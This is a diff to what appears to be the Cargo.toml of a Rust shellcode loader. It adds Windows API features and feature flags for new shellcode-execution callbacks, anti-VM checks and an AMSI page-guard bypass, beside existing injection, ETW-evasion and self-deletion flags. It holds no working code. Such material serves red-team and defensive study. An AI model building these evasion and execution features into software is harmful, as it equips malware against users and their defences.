@@ -40,10 +40,15 @@ features = [
     "Win32_System_ProcessStatus",
     "Win32_System_Power",
     "Win32_System_Memory",
+    "Win32_System_Com",
+    "Win32_UI_Shell",
     "Win32_NetworkManagement_NetManagement",
+    "Win32_NetworkManagement_IpHelper",
     "Win32_System_SystemInformation",
     "Win32_System_Registry",
     "Win32_System_Kernel",
+    "Win32_System_WindowsProgramming",
+    "Win32_System_Performance",
 ]
 
 [features]
@@ -87,6 +92,9 @@ ShellcodeExecuteMsgWaitForMultipleObjectsExAPC = ["windows-sys", "rust_syscalls"
 ShellcodeExecuteSleepExAPC = ["windows-sys", "rust_syscalls"]
 ShellcodeExecuteWaitForSingleObjectExAPC = ["windows-sys", "rust_syscalls"]
 ShellcodeExecuteSignalObjectAndWaitAPC = ["windows-sys", "rust_syscalls"]
+ShellcodeExecuteEnumSystemGeoID = ["windows-sys"]
+ShellcodeExecuteThreadpoolWait = ["windows-sys"]
+ShellcodeExecuteCDefFolderMenu = ["windows-sys"]
 default = []
 InjectionDefaultLocal = ["rust_syscalls"]
 InjectionMappingLocal = ["rust_syscalls"]
@@ -108,9 +116,12 @@ CheckAntiVMHyperV = ["windows-sys"]
 CheckAntiVMResolution = ["windows-sys"]
 CheckAntiVMFan = ["wmi", "windows-sys"]
 CheckAntiVMComprehensive = ["windows-sys"]
+CheckAntiVMICMP = ["windows-sys"]
+CheckAntiVMTimingDiscrepancy = ["windows-sys"]
 CheckDomainJoined = ["windows-sys"]
 EvasionAMSISimplePatch = ["windows-sys", "rust_syscalls"]
 EvasionAMSIHwbp = ["windows-sys"]
+EvasionAMSIPageGuard = ["windows-sys"]
 EvasionSelfDeletion = ["windows-sys"]
 EvasionETWSimple = ["windows-sys", "rust_syscalls"]
 EvasionETWWinAPI = ["windows-sys", "rust_syscalls"]
